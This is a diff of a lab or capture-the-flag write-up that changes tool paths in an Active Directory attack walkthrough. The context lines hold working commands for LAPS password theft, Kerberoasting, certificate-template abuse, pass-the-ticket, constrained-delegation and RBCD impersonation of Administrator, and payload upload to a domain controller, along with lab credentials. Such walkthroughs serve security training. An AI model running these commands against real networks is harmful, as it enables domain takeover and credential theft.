@@ -65,7 +65,7 @@ powershell -ep bypass -enc <base64-encoded-payload>
 Enumerate the domain using PowerView into the obtained beacon:
 
 ```powershell
-powershell-import /Users/ahmedpinger/Documents/Tools/PowerSploit/Recon/PowerView.ps1
+powershell-import /opt/tools/PowerSploit/Recon/PowerView.ps1
 ```
 
 #### 8. Enumerating LAPS
@@ -81,7 +81,7 @@ powershell Find-LapsADExtendedRights
 Retrieve the LAPS password:
 
 ```powershell
-powershell-import /Users/ahmedpinger/Documents/Tools/PowerSploit/Recon/PowerView.ps1
+powershell-import /opt/tools/PowerSploit/Recon/PowerView.ps1
 powerpick Get-DomainComputer -Identity wkstn1 -Properties ms-Mcs-AdmPwd
 ```
 - **Password Obtained**: `2gy)+VAxhTtA@R`
@@ -109,7 +109,7 @@ powershell type C:\Users\Administrator\Desktop\flag.txt
 
    Command:
    ```plaintext
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe asreproast /nowrap
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe asreproast /nowrap
    ```
 2. **Hash Cracking for Ticket**:
    - Utilize Hashcat to crack the obtained ticket hash for `svc-mssql`.
@@ -327,7 +327,7 @@ The flag 5 has some AV Bypassing so generate you payload according to this.
 
 1. **Execute Command on `MSSQL Server Beacon`:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/SharpWMI/SharpWMI/bin/Release/SharpWMI.exe action=exec computername=js-pc.hackr.games command="powershell -ep bypass -enc SQB...FAF"
+   execute-assembly /opt/tools/SharpWMI/SharpWMI/bin/Release/SharpWMI.exe action=exec computername=js-pc.hackr.games command="powershell -ep bypass -enc SQB...FAF"
    ```
    This command leverages WMI (Windows Management Instrumentation) to execute a PowerShell command on the target machine `js-pc`. WMI is a powerful management framework for Windows operating systems.
 
@@ -367,13 +367,13 @@ Run all commands on the `MSSQL Server Beacon`
 
 1. **Enumerate CA Certificates:**
    ```plaintext
-	 execute-assembly /Users/ahmedpinger/Documents/Tools/Certify/Certify/bin/Release/Certify.exe cas
+	 execute-assembly /opt/tools/Certify/Certify/bin/Release/Certify.exe cas
    ```
    This command enumerates the Certificate Authorities (CAs) configured on the Domain Controller.
 
 2. **Find Vulnerable Certificate Templates:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Certify/Certify/bin/Release/Certify.exe find /vulnerable
+   execute-assembly /opt/tools/Certify/Certify/bin/Release/Certify.exe find /vulnerable
    ```
    This command identifies vulnerable certificate templates on the Certificate Authority.
 
@@ -381,7 +381,7 @@ Run all commands on the `MSSQL Server Beacon`
    ```
    make_token HACKR\jjohn TheJsPass1@#
    
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Certify/Certify/bin/Release/Certify.exe request /ca:dc-1.hackr.games\hackr-DC-1-CA /template:CustomUser /altname:Administrator
+   execute-assembly /opt/tools/Certify/Certify/bin/Release/Certify.exe request /ca:dc-1.hackr.games\hackr-DC-1-CA /template:CustomUser /altname:Administrator
    ```
    This command requests a custom certificate from the Certificate Authority with the specified template and alternate name.
 
@@ -398,13 +398,13 @@ Run all commands on the `MSSQL Server Beacon`
    ```
    rev2self
    
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe asktgt /user:Administrator /certificate:MII{stripped}NLQ /password:asdf /nowrap
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe asktgt /user:Administrator /certificate:MII{stripped}NLQ /password:asdf /nowrap
    ```
    This command requests a Ticket Granting Ticket (TGT) for the Administrator user using the obtained certificate.
 
 2. **Create NetOnly Ticket with Rubeus:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:HACKR /username: Administrator /password:asdf /ticket:doIGVj{stripped}CCBlKgA
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:HACKR /username: Administrator /password:asdf /ticket:doIGVj{stripped}CCBlKgA
    ```
    This command creates a NetOnly ticket for command execution with the specified program path.
 
@@ -416,7 +416,7 @@ Run all commands on the `MSSQL Server Beacon`
 
 4. **Create NetOnly Ticket with Pass-The-Ticket (PTT):**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:doIGVj{stripped}CCBlKgA /ptt
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:doIGVj{stripped}CCBlKgA /ptt
    ```
    This command creates a NetOnly ticket with Pass-The-Ticket (PTT) option for immediate use.
 
@@ -425,7 +425,7 @@ Run all commands on the `MSSQL Server Beacon`
 1. **Upload Payload to DC:**
    ```
    cd \\dc-1.hackr.games\c$\Windows\Temp
-   upload /Users/ahmedpinger/payloads/smb_x64.exe
+   upload /opt/payloads/smb_x64.exe
    ```
    This command uploads a payload to the specified directory on the Domain Controller.
 
@@ -464,7 +464,7 @@ It involves the exploitation of Out-Bound domain trust and then moving forward a
 1. **Import PowerView Module:**
    Perform these things in a beacon of DC in the domain `hackr.games`.
    ```
-   powershell-import /Users/ahmedpinger/Documents/Tools/PowerSploit/Recon/PowerView.ps1
+   powershell-import /opt/tools/PowerSploit/Recon/PowerView.ps1
    ```
    This command imports the PowerView module, which is used for Active Directory enumeration.
 
@@ -486,13 +486,13 @@ It involves the exploitation of Out-Bound domain trust and then moving forward a
 
 1. **Request TGT for Trust Account:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe asktgt /user:HACKR$ /domain:kikrr.local /rc4:19fc7d52d877f61a78c4a9637fefffa6 /nowrap
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe asktgt /user:HACKR$ /domain:kikrr.local /rc4:19fc7d52d877f61a78c4a9637fefffa6 /nowrap
    ```
    This command requests a Ticket Granting Ticket (TGT) for the trust account `HACKR$` in the domain `kikrr.local` using the obtained RC4 hash.
 
 2. **Create NetOnly Ticket with TGT:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:kikrr.local /username:HACKR$ /password:adsf /ticket:doI[snip]FSD
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:kikrr.local /username:HACKR$ /password:adsf /ticket:doI[snip]FSD
    ```
    This command creates a NetOnly ticket for command execution in the `kikrr.local` domain using the obtained TGT. Now as we have the ticker in out key list, now we have somewhat tiny access to the domain `kikrr.local` and from this access we can perform some enumeration.
 
@@ -500,7 +500,7 @@ It involves the exploitation of Out-Bound domain trust and then moving forward a
 
 1. **Identify Kerberoastable Accounts:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe kerberoast /simple /domain:kikrr.local
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe kerberoast /simple /domain:kikrr.local
    ```
    This command identifies accounts vulnerable to Kerberoasting in the `kikrr.local` domain.
 
@@ -546,25 +546,25 @@ The Flag 8 involves the exploitation of a `Constrained Delegation` for  `File Se
 
 2. **Search for Constrained Delegation:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/ADSearch/ADSearch/bin/Release/ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
+   execute-assembly /opt/tools/ADSearch/ADSearch/bin/Release/ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
    ```
    This command searches for computer objects that have the attribute `msds-allowedtodelegateto` set, indicating the presence of constrained delegation. We found out with this command is the machine account of`print-srv` can perform `constrained delegation` on a several services on a `file server`.
 
 3. **List the TGTs for the Accounts:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe triage
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe triage
    ```
    This command performs a triage to identify potential targets for constrained delegation.
 
 4. **Dump Ticket for Krbtgt Service:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe dump /luid:0x3e4 /service:krgtgt
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe dump /luid:0x3e4 /service:krgtgt
    ```
    This command dumps the ticket for the `krgtgt` service, which is crucial for performing the S4U (Service for User) technique.
 
 5. **Perform S4U Technique:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/fs.kikrr.local /user:print-srv$ /ticket:doIFkD{snip}iqADAgEFoQ0bC0 /nowrap /ptt
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/fs.kikrr.local /user:print-srv$ /ticket:doIFkD{snip}iqADAgEFoQ0bC0 /nowrap /ptt
    ```
    This command uses the obtained ticket to impersonate the `Administrator` user and requests a service ticket for the target service `cifs/fs.kikrr.local` using the S4U protocol.
 
@@ -625,13 +625,13 @@ This Flag involves the exploitation of `RBCD` with the help of user `naa`
 
 1. **Create New Computer on a Domain:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/StandIn/StandIn/StandIn/bin/Release/StandIn.exe --computer EvilComputer --make
+   execute-assembly /opt/tools/StandIn/StandIn/StandIn/bin/Release/StandIn.exe --computer EvilComputer --make
    ```
    This command creates a new computer account named `EvilComputer` in the domain.
 
 2. **Obtain Hash for EvilComputer$ Account:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe hash /password:<Password retrieved from the creation of computer> /user:EvilComputer$ /domain:kikrr.local
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe hash /password:<Password retrieved from the creation of computer> /user:EvilComputer$ /domain:kikrr.local
    ```
    This command obtains the password hash for the `EvilComputer$` account.
 
@@ -645,7 +645,7 @@ This Flag involves the exploitation of `RBCD` with the help of user `naa`
    ```
    make_token KIKRR\naa TheNetworkaa1@#
    
-   powershell-import /Users/ahmedpinger/Documents/Tools/PowerSploit/Recon/PowerView.ps1
+   powershell-import /opt/tools/PowerSploit/Recon/PowerView.ps1
 
    powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3971172904-580618121-675634979-1601)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-1" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
    ```
@@ -655,13 +655,13 @@ This Flag involves the exploitation of `RBCD` with the help of user `naa`
 
 1. **Perform S4U Technique:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:cifs/dc-1.kikrr.local /ticket:doIFtjC[.....]CBbKgAwIBBaEDA /nowrap
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:cifs/dc-1.kikrr.local /ticket:doIFtjC[.....]CBbKgAwIBBaEDA /nowrap
    ```
    This command uses the obtained ticket to impersonate the `Administrator` user for the target service `cifs/dc-1.kikrr.local` using the S4U protocol. The ticket used here is of user `EvilComputer$`
 
 2. **Create NetOnly Process with S4U Ticket:**
    ```
-   execute-assembly /Users/ahmedpinger/Documents/Tools/Rubeus/Rubeus/bin/Release/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:KIKRR /username:Administrator /password:FakePass /ticket:doIGp[.....]DCCBqC
+   execute-assembly /opt/tools/Rubeus/Rubeus/bin/Release/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:KIKRR /username:Administrator /password:FakePass /ticket:doIGp[.....]DCCBqC
    ```
    This command creates a NetOnly process with the obtained S4U ticket, allowing command execution as the `Administrator` user.
 
